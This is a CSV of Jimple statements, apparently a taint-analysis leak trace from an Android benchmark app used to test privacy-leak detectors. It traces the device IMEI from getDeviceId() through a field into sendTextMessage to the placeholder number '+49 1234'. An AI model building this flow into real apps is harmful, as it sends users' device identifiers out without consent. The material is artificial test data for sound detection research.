,method,stmtLineNumber,stmt
0,<de.ecspride.MainActivity: void onCreate(android.os.Bundle)>,-1,$r2 = virtualinvoke r6.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()
1,<de.ecspride.MainActivity: void onCreate(android.os.Bundle)>,-1,r5.<de.ecspride.BaseClass: java.lang.String imei> = $r2
2,<de.ecspride.MainActivity: void onCreate(android.os.Bundle)>,-1,$r2 = r5.<de.ecspride.BaseClass: java.lang.String imei>
3,<de.ecspride.MainActivity: void onCreate(android.os.Bundle)>,-1,"virtualinvoke $r7.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>(""+49 1234"", null, $r2, null, null)"
